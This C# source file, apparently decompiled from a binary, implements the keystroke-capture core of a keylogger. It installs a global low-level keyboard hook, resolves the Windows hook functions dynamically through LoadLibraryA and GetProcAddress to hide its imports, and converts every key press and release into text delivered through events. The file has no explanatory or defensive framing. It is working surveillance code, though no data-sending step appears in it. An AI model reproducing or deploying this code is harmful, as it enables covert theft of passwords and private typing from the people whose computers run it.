using System;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;

internal class Class14
{
	private delegate int Delegate3(int int_0, Delegate6 delegate6_0, int int_1, int int_2);

	private delegate int Delegate4(int int_0, int int_1, int int_2, ref Struct0 struct0_0);

	private delegate int Delegate5(int int_0);

	private delegate int Delegate6(int int_0, int int_1, ref Struct0 struct0_0);

	public delegate void Delegate7(string string_0);

	public delegate void Delegate8(string string_0);

	private struct Struct0
	{
		public int int_0;

		public int int_1;

		public int int_2;

		public int int_3;

		public int int_4;
	}

	private Delegate7 delegate7_0;

	private Delegate8 delegate8_0;

	private static int int_0;

	private static Delegate6 delegate6_0;

	public event Delegate7 Event_0
	{
		[MethodImpl(MethodImplOptions.Synchronized)]
		add
		{
			delegate7_0 = (Delegate7)Delegate.Combine(delegate7_0, value);
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		remove
		{
			delegate7_0 = (Delegate7)Delegate.Remove(delegate7_0, value);
		}
	}

	public event Delegate8 Event_1
	{
		[MethodImpl(MethodImplOptions.Synchronized)]
		add
		{
			delegate8_0 = (Delegate8)Delegate.Combine(delegate8_0, value);
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		remove
		{
			delegate8_0 = (Delegate8)Delegate.Remove(delegate8_0, value);
		}
	}

	public void method_0()
	{
		delegate6_0 = method_2;
		int_0 = method_1<Delegate3>("user32:SetWindowsHookExA")(13, delegate6_0, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr LoadLibraryA(string string_0);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetProcAddress(IntPtr intptr_0, string string_0);

	private T method_1<T>(string string_0)
	{
		return (T)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(string_0.Split(new char[1] { ':' })[0]), string_0.Split(new char[1] { ':' })[1]), typeof(T));
	}

	private int method_2(int int_1, int int_2, ref Struct0 struct0_0)
	{
		if (int_1 == 0)
		{
			switch (int_2)
			{
			case 256:
			case 260:
				if (delegate7_0 != null)
				{
					delegate7_0(method_4((Keys)struct0_0.int_0));
				}
				break;
			case 257:
			case 261:
				if (delegate8_0 != null)
				{
					delegate8_0(method_4((Keys)struct0_0.int_0));
				}
				break;
			}
		}
		return method_1<Delegate4>("user32:CallNextHookEx")(int_0, int_1, int_2, ref struct0_0);
	}

	public void method_3()
	{
		method_1<Delegate5>("user32:UnhookWindowsHookEx")(int_0);
	}

	private string method_4(Keys keys_0)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0002: Expected I4, but got Unknown
		//IL_023c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0246: Unknown result type (might be due to invalid IL or missing references)
		//IL_024c: Unknown result type (might be due to invalid IL or missing references)
		//IL_038b: Unknown result type (might be due to invalid IL or missing references)
		//IL_04d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_04e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_04e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0614: Unknown result type (might be due to invalid IL or missing references)
		//IL_0634: Unknown result type (might be due to invalid IL or missing references)
		//IL_0651: Unknown result type (might be due to invalid IL or missing references)
		//IL_065b: Unknown result type (might be due to invalid IL or missing references)
		//IL_065d: Invalid comparison between Unknown and I4
		//IL_0665: Unknown result type (might be due to invalid IL or missing references)
		//IL_0671: Unknown result type (might be due to invalid IL or missing references)
		//IL_0682: Unknown result type (might be due to invalid IL or missing references)
		//IL_069d: Unknown result type (might be due to invalid IL or missing references)
		switch ((int)keys_0)
		{
		case 186:
		case 187:
		case 188:
		case 189:
		case 190:
		case 191:
		case 192:
		case 193:
		case 194:
		case 195:
		case 196:
		case 197:
		case 198:
		case 199:
		case 200:
		case 201:
		case 202:
		case 203:
		case 204:
		case 205:
		case 206:
		case 207:
		case 208:
		case 209:
		case 210:
		case 211:
		case 212:
		case 213:
		case 214:
		case 215:
		case 216:
		case 217:
		case 218:
		case 219:
		case 220:
		case 221:
		case 222:
			if ((Control.get_ModifierKeys() & 0x10000) != 0)
			{
				return ((object)keys_0).ToString() switch
				{
					"OemMinus" => "_", 
					"Oemplus" => "+", 
					"OemOpenBrackets" => "{", 
					"Oem6" => "}", 
					"Oem5" => "|", 
					"Oem1" => ":", 
					"Oem7" => "\"", 
					"Oemcomma" => "<", 
					"OemPeriod" => ">", 
					"OemQuestion" => "?", 
					"Oemtilde" => "~", 
					_ => string.Empty, 
				};
			}
			return ((object)keys_0).ToString() switch
			{
				"OemMinus" => "-", 
				"Oemplus" => "=", 
				"OemOpenBrackets" => "[", 
				"Oem6" => "]", 
				"Oem5" => "\\", 
				"Oem1" => ";", 
				"Oem7" => "'", 
				"Oemcomma" => ",", 
				"OemPeriod" => ".", 
				"OemQuestion" => "/", 
				"Oemtilde" => "`", 
				_ => string.Empty, 
			};
		case 13:
			return Environment.NewLine;
		case 32:
			return " ";
		case 48:
		case 49:
		case 50:
		case 51:
		case 52:
		case 53:
		case 54:
		case 55:
		case 56:
		case 57:
			if ((Control.get_ModifierKeys() & 0x10000) != 0)
			{
				return ((object)keys_0).ToString() switch
				{
					"D1" => "!", 
					"D2" => "@", 
					"D3" => "#", 
					"D4" => "$", 
					"D5" => "%", 
					"D6" => "^", 
					"D7" => "&", 
					"D8" => "*", 
					"D9" => "(", 
					"D0" => ")", 
					_ => string.Empty, 
				};
			}
			return ((object)keys_0).ToString()!.Replace("D", string.Empty);
		default:
			return "[" + ((object)keys_0).ToString() + "]";
		case 65:
		case 66:
		case 67:
		case 68:
		case 69:
		case 70:
		case 71:
		case 72:
		case 73:
		case 74:
		case 75:
		case 76:
		case 77:
		case 78:
		case 79:
		case 80:
		case 81:
		case 82:
		case 83:
		case 84:
		case 85:
		case 86:
		case 87:
		case 88:
		case 89:
		case 90:
		case 91:
		case 92:
		case 93:
		case 94:
		case 95:
			if (Control.IsKeyLocked((Keys)20) | ((Control.get_ModifierKeys() & 0x10000) != 0))
			{
				return ((object)keys_0).ToString();
			}
			return ((object)keys_0).ToString()!.ToLower();
		case 96:
		case 97:
		case 98:
		case 99:
		case 100:
		case 101:
		case 102:
		case 103:
		case 104:
		case 105:
			return ((object)keys_0).ToString()!.Replace("NumPad", string.Empty);
		case 106:
		case 107:
		case 108:
		case 109:
		case 110:
		case 111:
			return ((object)keys_0).ToString() switch
			{
				"Decimal" => ".", 
				"Add" => "+", 
				"Subtract" => "-", 
				"Multiply" => "*", 
				"Divide" => "/", 
				_ => string.Empty, 
			};
		}
	}
}
